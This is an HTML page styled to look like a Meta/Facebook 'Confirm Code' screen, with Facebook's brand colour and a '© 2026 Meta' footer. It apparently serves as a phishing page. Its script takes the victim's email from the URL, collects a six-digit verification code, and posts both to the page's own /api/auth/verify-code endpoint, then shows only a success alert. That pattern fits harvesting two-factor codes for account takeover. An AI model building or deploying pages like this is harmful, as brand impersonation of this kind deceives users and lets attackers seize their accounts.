<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Confirm code</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Segoe UI, Arial;
}

body{
background:#f0f2f5;
min-height:100vh;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
padding:20px;
}

/* TITLE */

.title{
font-size:38px;
font-weight:900;
color:#1877f2;
margin-bottom:25px;
text-align:center;
}

/* CARD */

.card{
background:white;
padding:30px;
border-radius:12px;
width:100%;
max-width:420px;
text-align:center;
box-shadow:0 12px 35px rgba(0,0,0,0.15);
}

/* DESCRIPTION */

.description{
font-size:15px;
color:#555;
margin-top:10px;
}

/* CODE INPUT */

.code-input{
display:flex;
justify-content:space-between;
gap:8px;
margin-top:25px;
}

.code-input input{
width:45px;
height:55px;
font-size:24px;
text-align:center;
border:1px solid #ddd;
border-radius:8px;
}

.code-input input:focus{
outline:none;
border-color:#1877f2;
box-shadow:0 0 0 3px rgba(24,119,242,0.15);
}

/* BUTTON */

.confirm-btn{
margin-top:25px;
width:100%;
padding:15px;
border:none;
border-radius:8px;
background:#1877f2;
color:white;
font-size:17px;
font-weight:bold;
cursor:pointer;
}

.confirm-btn.loading{
background:#9bbcf5;
cursor:not-allowed;
}

/* RESEND */

.resend{
margin-top:18px;
font-size:14px;
color:#777;
}

.resend-btn{
margin-top:10px;
padding:10px 18px;
border:none;
border-radius:6px;
background:#1877f2;
color:white;
font-weight:bold;
cursor:pointer;
display:none;
}

/* FOOTER */

.site-footer{
margin-top:40px;
text-align:center;
font-size:13px;
color:#737373;
}

.languages span,
.links span{
margin:0 8px;
cursor:pointer;
}

.languages{
margin-bottom:8px;
}

.footer-bottom{
margin-top:10px;
font-size:12px;
color:#8a8d91;
}

</style>

</head>

<body>

<h1 class="title">Confirm Code</h1>

<div class="card">

<h2>Check your email for a code</h2>

<p class="description" id="message">
Please enter the verification code sent to your email.
</p>

<div class="code-input">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
</div>

<button class="confirm-btn" id="confirmBtn" onclick="confirmCode()">Confirm Code</button>

<div class="resend">
Didn't get the code? <span id="timer">120</span>s
</div>

<button class="resend-btn" id="resendBtn" onclick="resendCode()">Resend Code</button>

</div>

<div class="site-footer">

<div class="languages">
<span>English</span>
<span>Hausa</span>
<span>Français</span>
<span>Español</span>
<span>Português</span>
<span>العربية</span>
</div>

<div class="links">
<span>About</span>
<span>Privacy</span>
<span>Terms</span>
<span>Help</span>
<span>Developers</span>
<span>Careers</span>
</div>

<div class="footer-bottom">
© 2026 Meta · Privacy · Terms · Help
</div>

</div>

<script>

const params = new URLSearchParams(window.location.search)
const email = params.get("email")

if(email){
document.getElementById("message").innerText =
"Please enter the 6-digit verification code sent to " + email
}

const inputs = document.querySelectorAll(".code-input input")

inputs.forEach((input,index)=>{

input.addEventListener("input",()=>{

if(input.value.length === 1 && index < 5){
inputs[index+1].focus()
}

checkCodeComplete()

})

})

inputs.forEach(input=>{

input.addEventListener("paste",(e)=>{

const pasteData = e.clipboardData.getData("text").trim()

if(pasteData.length === 6){

e.preventDefault()

for(let i=0;i<6;i++){
inputs[i].value = pasteData[i]
}

checkCodeComplete()

}

})

})

function checkCodeComplete(){

let code=""

inputs.forEach(input=>{
code += input.value
})

if(code.length === 6){
confirmCode()
}

}

let seconds = 120
const timer = document.getElementById("timer")
const resendBtn = document.getElementById("resendBtn")

const interval = setInterval(()=>{

seconds--

if(seconds <= 0){

clearInterval(interval)

timer.innerText = "0"
resendBtn.style.display="inline-block"

return
}

timer.innerText = seconds

},1000)

function resendCode(){

seconds = 120
location.reload()

}

async function confirmCode(){

const btn = document.getElementById("confirmBtn")

let code=""

inputs.forEach(input=>{
code += input.value
})

if(code.length !== 6){
return
}

btn.classList.add("loading")
btn.innerText="Verifying..."

try{

const response = await fetch("/api/auth/verify-code",{

method:"POST",
credentials:"include",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({
email:email,
code:code
})

})

const data = await response.json()

if(data.success){

alert("Code submitted successfully")

}else{

alert("Verification failed")

}

btn.classList.remove("loading")
btn.innerText="Confirm Code"

}catch(err){

alert("Server connection error")

btn.classList.remove("loading")
btn.innerText="Confirm Code"

}

}

</script>

</body>
</html>
